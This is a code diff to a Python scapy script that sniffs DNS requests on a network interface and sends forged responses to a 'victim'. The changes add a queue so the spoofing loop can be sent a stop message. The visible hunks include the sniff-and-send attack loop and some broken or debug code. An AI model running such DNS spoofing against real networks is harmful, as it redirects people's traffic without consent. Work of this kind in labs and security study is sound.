@@ -1,4 +1,15 @@
 from scapy.all import *
+import Queue as q
+
+
+que = q.Queue()
+
+def put_q(put):
+    que.put(put)
+
+def get_q():
+    que.get(False)
+
 # import scanning as scan
 from sys import argv
 import socket
@@ -18,12 +29,13 @@ def alter_packet(d_pkt):
     return new_pkt
 """
 
+
 def dns_spoof(interface):
     # sniff DNS traffic one at a time
     # , iface=argv[1]
     print("hoi2")
     while 1:
-        DNSpkt = scapy.all.sniff(iface =interface, count=1, filter="dst port 53")
+        DNSpkt = scapy.all.sniff(iface=interface, count=1, filter="dst port 53")
         # if it is a DNS request, start with creating response DNSpkt[0].haslayer(scapy.all.DNSQR):
         if 1:
             # ignore this: alter_packet(DNSpkt)
@@ -56,6 +68,15 @@ def dns_spoof(interface):
             # send packet to victim
             print(spoof_response)
             scapy.all.send(spoof_response)
+            try:
+                message = que.get(False)
+                if message == "stop":
+                    logger.info("Stopping DNS spoofing")
+                    break
+                else:
+                    que.put(message)
+            except:
+                q.Empty
         # elif: exit??
 
 
